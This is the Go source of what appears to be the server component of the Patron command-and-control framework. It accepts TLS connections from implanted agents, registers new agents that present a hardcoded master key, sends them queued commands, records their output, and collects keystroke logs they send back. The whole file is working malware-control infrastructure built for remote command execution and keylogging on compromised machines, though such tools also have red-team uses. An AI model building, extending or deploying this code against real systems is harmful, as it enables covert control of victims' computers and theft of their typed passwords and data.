package main

import (
	"bufio"
	"crypto/tls"
	"encoding/gob"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/google/uuid"
)

func main() {
	initializeServer()
	listener := createListener()
	defer listener.Close()

	ticker := time.Tick(300 * time.Second)
	for {
		select {
		case <-ticker:
			go data.UpdateAgentStatus()
		default:
			connection, err := listener.Accept()
			if err != nil {
				logger.Logf(logger.Error, "Error accepting connection: %v\n", err)
			}
			go handleConnection(connection)
		}
	}
}

func initializeServer() {
	enableLogging := true
	logger.EnableLogging(enableLogging)
	err := logger.SetLogFile("logs/server.log")
	if err != nil {
		log.Fatalf("Error setting log file: %v\n", err)
	}

	data.OpenDatabase()
	data.InitDatabase()
}

func createListener() (net.Listener) {
	c2serverip := os.Getenv("C2SERVER_IP")
	c2serverport := os.Getenv("C2SERVER_PORT")

	cer, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
	if err != nil {
		log.Fatalf("Error loading certificate: %v\n", err)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cer}}

	listener, err := tls.Listen("tcp", c2serverip+":"+c2serverport, config)
	if err != nil {
		log.Fatalf("Error starting listener: %v\n", err)
	}

	return listener
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	text, _ := bufio.NewReader(conn).ReadString('\n')
	messageParts := strings.Split(text, "\n")
	if len(messageParts) > 0 && messageParts[0] != "" {
		processMessage(conn, messageParts[0])
	}
}

func processMessage(conn net.Conn, message string) {
	parts := strings.Split(message, ":")
	if len(parts) != 11 {
		logger.Logf(logger.Info, "Invalid message format\n")
		return
	}

	uid := parts[0]
	if !isValidUUID(uid) {
		logger.Logf(logger.Info, "Invalid UUID\n")
		return
	}

	user, hostname, ip := parts[1], parts[2], parts[3]
	beaconType := parts[5]
	agentServerIP, agentServerPort := parts[6], parts[7]
	frequency, jitter := parts[8], parts[9]
	masterkey := parts[10]

	agentExists := validateOrCreateAgent(uid, masterkey, agentServerIP, agentServerPort, frequency, jitter, ip, user, hostname)
	if !agentExists {
		logger.Logf(logger.Info, "Unknown agent or invalid key\n")
		return
	}

	switch beaconType {
	case "NoKeysBeacon":
		handleCommandResponse(conn, uid)
	case "KeysBeacon":
		handleKeyLogResponse(conn, uid)
	default:
		logger.Logf(logger.Info, "Unknown beacon type\n")
	}
}

func isValidUUID(u string) bool {
	_, err := uuid.Parse(u)
	return err == nil
}

func validateOrCreateAgent(uid, masterkey, serverIP, serverPort, freq, jitter, ip, user, hostname string) bool {
	fetch, err := data.FetchOneAgent(uid)
	if err != nil {
		logger.Logf(logger.Warning, "Couldn't fetch agent: %v\n", err)
		return false
	}

	if fetch.Uuid == "" && masterkey == "MASTERKEY" {
		data.CreateAgent(uid, serverIP+":"+serverPort, freq, jitter, ip, user, hostname)
		data.CreateKeys(uid)
		fetch, err = data.FetchOneAgent(uid)
		if err != nil {
			logger.Logf(logger.Warning, "Couldn't fetch agent after creation: %v\n", err)
			return false
		}
	}

	return fetch.Uuid == uid
}

func handleCommandResponse(conn net.Conn, uid string) {
	logger.Logf(logger.Info, "Agent %s connected for command response\n", uid)

	encoder := gob.NewEncoder(conn)
	instruct := data.FetchNextCommand(uid)
	if err := encoder.Encode(instruct); err != nil {
		logger.Logf(logger.Error, "Failed to send command: %v\n", err)
		return
	}

	destruct := &types.GiveServerResult{}
	decoder := gob.NewDecoder(conn)
	logger.Logf(logger.Debug, "Destruct: %v \n", destruct)
	if err := decoder.Decode(destruct); err != nil {
		logger.Logf(logger.Error, "Failed to decode response: %v\n", err)
		return
	}

	if destruct.Result == "2" {
		logger.Logf(logger.Debug, "Agent %s sent no response\n", uid)
	} else {
		logger.Logf(logger.Debug, "Agent %s responded: %s\n", uid, destruct.Output)
		data.UpdateAgentCommand(destruct.CommandUUID, destruct.Output, uid)
	}

	if destruct.Output == "~Killed~" {
		logger.Logf(logger.Warning, "Agent %s terminated\n", uid)
	}

	data.UpdateAgentCheckIn(uid, time.Now().Unix())
}

func handleKeyLogResponse(conn net.Conn, uid string) {
	logger.Logf(logger.Info, "Agent %s connected for key log response\n", uid)

	encoder := gob.NewEncoder(conn)
	if err := encoder.Encode(&types.KeySend{Uuid: uid}); err != nil {
		logger.Logf(logger.Error, "Failed to send key request: %v\n", err)
		return
	}

	destruct := &types.KeyReceive{}
	decoder := gob.NewDecoder(conn)
	if err := decoder.Decode(destruct); err != nil {
		logger.Logf(logger.Error, "Failed to decode key log response: %v\n", err)
		return
	}

	if destruct.Keys != "" {
		logger.Logf(logger.Debug, "Agent %s sent keys: %s\n", uid, destruct.Keys)
		data.UpdateAgentKeys(uid, destruct.Keys)
	} else {
		logger.Logf(logger.Debug, "Agent %s sent no keys\n", uid)
	}

	data.UpdateAgentCheckIn(uid, time.Now().Unix())
}
